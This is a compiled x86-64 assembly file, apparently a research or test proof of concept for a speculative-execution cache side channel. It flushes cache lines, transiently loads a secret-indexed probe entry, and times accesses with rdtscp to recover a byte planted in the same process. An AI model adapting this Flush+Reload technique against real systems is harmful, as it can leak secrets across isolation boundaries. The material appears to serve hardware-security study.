	.file	"data_mem_dcache_load.c"
	.text
	.globl	probe
	.data
	.align 32
	.type	probe, @object
	.size	probe, 160
probe:
	.string	"\377"
	.zero	158
	.comm	str,2048,32
	.globl	secret
	.type	secret, @object
	.size	secret, 1
secret:
	.byte	42
	.comm	cache_test,131072,32
	.globl	temp
	.bss
	.align 8
	.type	temp, @object
	.size	temp, 8
temp:
	.zero	8
	.data
	.align 4
	.type	a, @object
	.size	a, 4
a:
	.long	10
	.align 4
	.type	b, @object
	.size	b, 4
b:
	.long	5
	.align 4
	.type	c, @object
	.size	c, 4
c:
	.long	3
	.align 4
	.type	d, @object
	.size	d, 4
d:
	.long	999
	.align 4
	.type	e, @object
	.size	e, 4
e:
	.long	9
	.section	.rodata
.LC0:
	.string	"%i,"
.LC1:
	.string	"%lu\n"
	.text
	.globl	attack
	.type	attack, @function
attack:
.LFB4262:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	subq	$2192, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movq	%rdi, -2200(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -2188(%rbp)
	movl	$0, -2184(%rbp)
	jmp	.L2
.L3:
	movl	-2184(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	cache_test(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -2152(%rbp)
	movq	-2152(%rbp), %rax
	clflush	(%rax)
	nop
	movl	-2184(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -2184(%rbp)
.L2:
	movl	-2184(%rbp), %eax
	cmpl	$255, %eax
	jle	.L3
	leaq	a(%rip), %rax
	movq	%rax, -2104(%rbp)
	movq	-2104(%rbp), %rax
	clflush	(%rax)
	nop
	leaq	b(%rip), %rax
	movq	%rax, -2112(%rbp)
	movq	-2112(%rbp), %rax
	clflush	(%rax)
	nop
	leaq	c(%rip), %rax
	movq	%rax, -2120(%rbp)
	movq	-2120(%rbp), %rax
	clflush	(%rax)
	nop
	leaq	d(%rip), %rax
	movq	%rax, -2128(%rbp)
	movq	-2128(%rbp), %rax
	clflush	(%rax)
	nop
	leaq	e(%rip), %rax
	movq	%rax, -2136(%rbp)
	movq	-2136(%rbp), %rax
	clflush	(%rax)
	nop
	leaq	secret(%rip), %rax
	movq	%rax, -2144(%rbp)
	movq	-2144(%rbp), %rax
	clflush	(%rax)
	nop
	movq	-2200(%rbp), %rax
	movq	%rax, 24+str(%rip)
	movl	$0, -2180(%rbp)
	jmp	.L4
.L5:
	movl	-2180(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -2180(%rbp)
.L4:
	movl	-2180(%rbp), %eax
	cmpl	$99, %eax
	jle	.L5
	movl	a(%rip), %edx
	movl	b(%rip), %eax
	imull	%eax, %edx
	movl	c(%rip), %ecx
	movl	e(%rip), %eax
	imull	%ecx, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	subl	$20, %eax
	cltq
	leaq	0(,%rax,8), %rdx
	leaq	str(%rip), %rax
	movq	$0, (%rdx,%rax)
	movq	24+str(%rip), %rax
	leaq	probe(%rip), %rdx
	movzbl	(%rax,%rdx), %ebx
	movzbl	%bl, %eax
	sall	$9, %eax
	cltq
	leaq	cache_test(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movzbl	%al, %edx
	movq	temp(%rip), %rax
	andq	%rdx, %rax
	movq	%rax, temp(%rip)
	movq	$-1, -2168(%rbp)
	movl	$0, -2172(%rbp)
	movl	$0, -2176(%rbp)
	jmp	.L6
.L7:
	movl	-2176(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -2176(%rbp)
.L6:
	movl	-2176(%rbp), %eax
	cmpl	$99, %eax
	jle	.L7
	movl	$0, %ebx
	jmp	.L8
.L14:
	movl	%ebx, %eax
	sall	$9, %eax
	cltq
	leaq	cache_test(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -2160(%rbp)
	leaq	-2188(%rbp), %rax
	movq	%rax, -2088(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-2088(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-2160(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %edx
	movl	-2188(%rbp), %eax
	andl	%edx, %eax
	movl	%eax, -2188(%rbp)
	leaq	-2188(%rbp), %rax
	movq	%rax, -2096(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-2096(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rdx
	movslq	%ebx, %rax
	movq	%rdx, -2080(%rbp,%rax,8)
	movl	%ebx, %esi
	leaq	.LC0(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movslq	%ebx, %rax
	movq	-2080(%rbp,%rax,8), %rax
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	testl	%ebx, %ebx
	je	.L17
	movzbl	probe(%rip), %eax
	movzbl	%al, %eax
	cmpl	%eax, %ebx
	je	.L17
	movslq	%ebx, %rax
	movq	-2080(%rbp,%rax,8), %rax
	cmpq	%rax, -2168(%rbp)
	jbe	.L13
	movslq	%ebx, %rax
	movq	-2080(%rbp,%rax,8), %rax
	movq	%rax, -2168(%rbp)
	movl	%ebx, -2172(%rbp)
	jmp	.L13
.L17:
	nop
.L13:
	addl	$1, %ebx
.L8:
	cmpl	$255, %ebx
	jle	.L14
	movl	-2172(%rbp), %eax
	movq	-24(%rbp), %rdi
	xorq	%fs:40, %rdi
	je	.L16
	call	__stack_chk_fail@PLT
.L16:
	addq	$2192, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4262:
	.size	attack, .-attack
	.section	.rodata
	.align 8
.LC2:
	.string	"Usage: ./data_mem_dcache_load [secret_value]\n"
	.align 8
.LC3:
	.string	"\twhere secret_value is an int from [1,%u)\n"
	.text
	.globl	die_usage
	.type	die_usage, @function
die_usage:
.LFB4263:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	stderr(%rip), %rax
	movq	%rax, %rcx
	movl	$45, %edx
	movl	$1, %esi
	leaq	.LC2(%rip), %rdi
	call	fwrite@PLT
	movq	stderr(%rip), %rax
	movl	$256, %edx
	leaq	.LC3(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
	movl	$1, %edi
	call	exit@PLT
	.cfi_endproc
.LFE4263:
	.size	die_usage, .-die_usage
	.section	.rodata
	.align 8
.LC4:
	.string	"Attack succeeded. Secret correctly guessed as %d\n"
	.align 8
.LC5:
	.string	"Attack failed. Could not determine the secret (%d)\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4264:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	cmpl	$2, -20(%rbp)
	jle	.L20
	call	die_usage
.L20:
	movb	$42, secret(%rip)
	cmpl	$2, -20(%rbp)
	jne	.L21
	movq	-32(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movq	%rax, %rdi
	call	atoi@PLT
	movb	%al, secret(%rip)
.L21:
	leaq	secret(%rip), %rdx
	leaq	probe(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movl	$0, -16(%rbp)
	jmp	.L22
.L23:
	movl	-16(%rbp), %eax
	cltq
	leaq	cache_test(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$1, -16(%rbp)
.L22:
	movl	-16(%rbp), %eax
	cmpl	$131071, %eax
	jbe	.L23
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	attack
	movl	%eax, -12(%rbp)
	movzbl	secret(%rip), %eax
	movzbl	%al, %eax
	cmpl	%eax, -12(%rbp)
	jne	.L24
	movzbl	secret(%rip), %eax
	movzbl	%al, %edx
	movq	stderr(%rip), %rax
	leaq	.LC4(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
	jmp	.L25
.L24:
	movzbl	secret(%rip), %eax
	movzbl	%al, %edx
	movq	stderr(%rip), %rax
	leaq	.LC5(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
.L25:
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4264:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
